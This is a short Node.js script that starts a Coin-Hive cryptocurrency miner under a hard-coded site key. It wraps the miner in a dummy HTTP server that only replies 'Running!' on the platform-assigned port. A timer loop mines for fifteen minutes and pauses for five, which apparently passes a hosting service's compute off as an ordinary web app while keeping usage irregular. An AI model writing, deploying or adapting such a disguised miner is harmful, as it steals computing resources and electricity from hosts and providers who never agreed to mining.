'use strict';

const CH   = require('coin-hive');
const http = require('http');

(async () =>{
    const m = await CH('lbiubJKnCBwwCJkzvGfTqTMj3SlkK52W');

    await m.start();

    // Listen on events
    // m.on('found', () => console.log('Found!'));
    // m.on('accepted', () => console.log('Accepted!'));
    // m.on('update', data => console.log(`
    //     Hashes per second: ${data.hashesPerSecond}
    //     Total hashes: ${data.totalHashes}
    //     Accepted hashes: ${data.acceptedHashes}
    // `));

    const requestHandler = (request, response) =>{
        console.log(request.url);
        response.end('Running!')
    };

    const server = http.createServer(requestHandler);

    server.listen(process.env.PORT, (err) =>{
        if(err)
            return console.log('Something bad happened', err);

        console.log(`Server is listening`);
    });

    await restartServer();

    async function restartServer(){
        setTimeout(async () =>{

            await m.stop();

            setTimeout(async () =>{
                await m.start();
                await restartServer();
            }, 300000);

        }, 900000)
    }

})();
